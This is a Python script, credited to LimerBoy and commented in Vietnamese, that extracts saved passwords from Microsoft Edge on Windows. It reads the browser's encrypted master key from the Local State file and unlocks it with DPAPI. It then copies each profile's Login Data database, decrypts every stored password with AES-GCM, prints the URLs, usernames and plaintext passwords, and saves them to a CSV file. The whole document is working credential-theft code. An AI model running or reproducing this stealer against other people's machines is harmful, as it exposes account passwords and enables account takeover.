#Full Credits to LimerBoy
import os # tương tác với hdh và thao tác với các tập tin và thư mục
import re # cung cấp các phép toán biểu thức chính quy để so khớp mẫu và thao tác văn bản.
import sys # tương tác với trình thông dịch Python, thường được sử dụng để truy cập các đối số dòng lệnh.
import json # phân tích và tạo dữ liệu JSON, một định dạng phổ biến cho trao đổi dữ liệu.
import base64 # mã hóa và giải mã dữ liệu sử dụng lược đồ mã hóa Base64, thường được sử dụng cho dữ liệu nhị phân.
import sqlite3 # tương tác với cơ sở dữ liệu SQLite, một hệ thống cơ sở dữ liệu nhẹ.
import win32crypt # cung cấp các chức năng mật mã dành riêng cho Windows để bảo vệ và giải mã dữ liệu.
from Cryptodome.Cipher import AES # triển khai thuật toán mã hóa AES, một phương pháp mã hóa đối xứng an toàn.
import shutil # cung cấp các hoạt động tập tin cấp cao để sao chép, di chuyển và quản lý tập tin.
import csv # xử lý việc đọc và ghi dữ liệu ở định dạng CSV (giá trị được phân cách bằng dấu phẩy).

#GLOBAL CONSTANT
EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
# Khi bạn sử dụng %(os.environ['USERPROFILE']), Python sẽ thay thế biến này bằng giá trị của biến môi trường 'USERPROFILE' được trả về bởi hàm os.environ. Kết quả sẽ là một chuỗi đại diện cho đường dẫn đến thư mục người dùng trên hệ thống Windows.
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( EDGE_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Edge secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Edge version <80 not supported. Please check.")
        return ""
    
def get_db_connection(edge_path_login_db):
    try:
        print(edge_path_login_db)
        shutil.copy2(edge_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Edge database cannot be found")
        return None
        
if __name__ == '__main__':
    try:
        #Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(EDGE_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
            	#(2) Get ciphertext from sqlite database
                edge_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(EDGE_PATH,folder))
                conn = get_db_connection(edge_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor() # Tạo con trỏ
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d"%(index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("*"*50)
                            #(5) Save into CSV 
                            csv_writer.writerow([index,url,username,decrypted_password])
                    #Close database connection
                    cursor.close()
                    conn.close()
                    #Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))
